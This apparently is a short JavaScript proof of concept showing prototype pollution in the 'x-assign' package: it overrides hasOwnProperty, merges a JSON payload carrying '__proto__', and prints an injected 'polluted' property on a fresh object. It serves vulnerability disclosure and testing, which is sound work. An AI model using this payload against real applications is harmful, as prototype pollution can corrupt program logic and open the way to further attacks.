Object.prototype.hasOwnProperty = () => true;
const XAssign = require('x-assign');
console.log({}.polluted);
const a = { red: 'apple' };
const b = JSON.parse('{"__proto__": {"polluted": "yes"}}');
const c = XAssign.assign(a, b);
console.log({}.polluted);